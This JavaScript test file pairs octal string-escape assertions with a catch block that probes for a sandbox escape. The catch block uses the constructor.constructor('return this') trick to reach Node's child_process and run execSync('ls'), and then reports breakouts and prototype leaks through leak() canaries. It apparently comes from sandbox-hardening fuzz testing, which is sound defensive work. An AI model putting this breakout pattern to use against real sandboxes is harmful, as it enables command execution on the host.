try {
    assert.sameValue('\0', '\0', '\\0');
    assert.sameValue('\x01', '\x01', '\\1');
    assert.sameValue('\x02', '\x02', '\\2');
    assert.sameValue('\x03', '\x03', '\\3');
    assert.sameValue('\x04', '\x04', '\\4');
    assert.sameValue('\x05', '\x05', '\\5');
    assert.sameValue('\x06', '\x06', '\\6');
    assert.sameValue('\x07', '\x07', '\\7');
    assert.sameValue('\x008', '\x008', '\\08');
    assert.sameValue('\x018', '\x018', '\\18');
    assert.sameValue('\x028', '\x028', '\\28');
    assert.sameValue('\x038', '\x038', '\\38');
    assert.sameValue('\x048', '\x048', '\\48');
    assert.sameValue('\x058', '\x058', '\\58');
    assert.sameValue('\x068', '\x068', '\\68');
    assert.sameValue('\x078', '\x078', '\\78');
    assert.sameValue('\x008', '\x008', '\\08');
    assert.sameValue('\0', '\0', '\\00');
    assert.sameValue('\x01', '\x01', '\\01');
    assert.sameValue('\x06', '\x06', '\\06');
    assert.sameValue('\x07', '\x07', '\\07');
    assert.sameValue('\b', '\b', '\\10');
    assert.sameValue('\t', '\t', '\\11');
    assert.sameValue('\x0E', '\x0E', '\\16');
    assert.sameValue('\x0F', '\x0F', '\\17');
    assert.sameValue('\x10', '\x10', '\\20');
    assert.sameValue('\x11', '\x11', '\\21');
    assert.sameValue('\x16', '\x16', '\\26');
    assert.sameValue('\x17', '\x17', '\\27');
    assert.sameValue('\x18', '\x18', '\\30');
    assert.sameValue('\x19', '\x19', '\\31');
    assert.sameValue('\x1E', '\x1E', '\\36');
    assert.sameValue('\x1F', '\x1F', '\\37');
    assert.sameValue('\x008', '\x008', '\\008');
    assert.sameValue('\x018', '\x018', '\\018');
    assert.sameValue('\x068', '\x068', '\\068');
    assert.sameValue('\x078', '\x078', '\\078');
    assert.sameValue('\b8', '\b8', '\\108');
    assert.sameValue('\t8', '\t8', '\\118');
    assert.sameValue('\x0E8', '\x0E8', '\\168');
    assert.sameValue('\x0F8', '\x0F8', '\\178');
    assert.sameValue('\x108', '\x108', '\\208');
    assert.sameValue('\x118', '\x118', '\\218');
    assert.sameValue('\x168', '\x168', '\\268');
    assert.sameValue('\x178', '\x178', '\\278');
    assert.sameValue('\x188', '\x188', '\\308');
    assert.sameValue('\x198', '\x198', '\\318');
    assert.sameValue('\x1E8', '\x1E8', '\\368');
    assert.sameValue('\x1F8', '\x1F8', '\\378');
    assert.sameValue(' ', ' ', '\\40');
    assert.sameValue('!', '!', '\\41');
    assert.sameValue('&', '&', '\\46');
    assert.sameValue('\'', '\'', '\\47');
    assert.sameValue('(', '(', '\\50');
    assert.sameValue(')', ')', '\\51');
    assert.sameValue('.', '.', '\\56');
    assert.sameValue('/', '/', '\\57');
    assert.sameValue('0', '0', '\\60');
    assert.sameValue('1', '1', '\\61');
    assert.sameValue('6', '6', '\\66');
    assert.sameValue('7', '7', '\\67');
    assert.sameValue('8', '8', '\\70');
    assert.sameValue('9', '9', '\\71');
    assert.sameValue('>', '>', '\\76');
    assert.sameValue('?', '?', '\\77');
    assert.sameValue(' 0', ' 0', '\\400');
    assert.sameValue('!0', '!0', '\\410');
    assert.sameValue('&0', '&0', '\\460');
    assert.sameValue('\'0', '\'0', '\\470');
    assert.sameValue('(0', '(0', '\\500');
    assert.sameValue(')0', ')0', '\\510');
    assert.sameValue('.0', '.0', '\\560');
    assert.sameValue('/0', '/0', '\\570');
    assert.sameValue('00', '00', '\\600');
    assert.sameValue('10', '10', '\\610');
    assert.sameValue('60', '60', '\\660');
    assert.sameValue('70', '70', '\\670');
    assert.sameValue('80', '80', '\\700');
    assert.sameValue('90', '90', '\\710');
    assert.sameValue('>0', '>0', '\\760');
    assert.sameValue('?0', '?0', '\\770');
    assert.sameValue('\0', '\0', '\\000');
    assert.sameValue('\x01', '\x01', '\\001');
    assert.sameValue('\b', '\b', '\\010');
    assert.sameValue('\x06', '\x06', '\\006');
    assert.sameValue('0', '0', '\\060');
    assert.sameValue('\x07', '\x07', '\\007');
    assert.sameValue('8', '8', '\\070');
    assert.sameValue('?', '?', '\\077');
    assert.sameValue('@', '@', '\\100');
    assert.sameValue('A', 'A', '\\101');
    assert.sameValue('H', 'H', '\\110');
    assert.sameValue('F', 'F', '\\106');
    assert.sameValue('p', 'p', '\\160');
    assert.sameValue('G', 'G', '\\107');
    assert.sameValue('x', 'x', '\\170');
    assert.sameValue('\x7F', '\x7F', '\\177');
    assert.sameValue('\x80', '\x80', '\\200');
    assert.sameValue('\x81', '\x81', '\\201');
    assert.sameValue('\x88', '\x88', '\\210');
    assert.sameValue('\x86', '\x86', '\\206');
    assert.sameValue('\xB0', '\xB0', '\\260');
    assert.sameValue('\x87', '\x87', '\\207');
    assert.sameValue('\xB8', '\xB8', '\\270');
    assert.sameValue('\xBF', '\xBF', '\\277');
    assert.sameValue('À', 'À', '\\300');
    assert.sameValue('Á', 'Á', '\\301');
    assert.sameValue('È', 'È', '\\310');
    assert.sameValue('Æ', 'Æ', '\\306');
    assert.sameValue('ð', 'ð', '\\360');
    assert.sameValue('Ç', 'Ç', '\\307');
    assert.sameValue('ø', 'ø', '\\370');
    assert.sameValue('ÿ', 'ÿ', '\\377');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}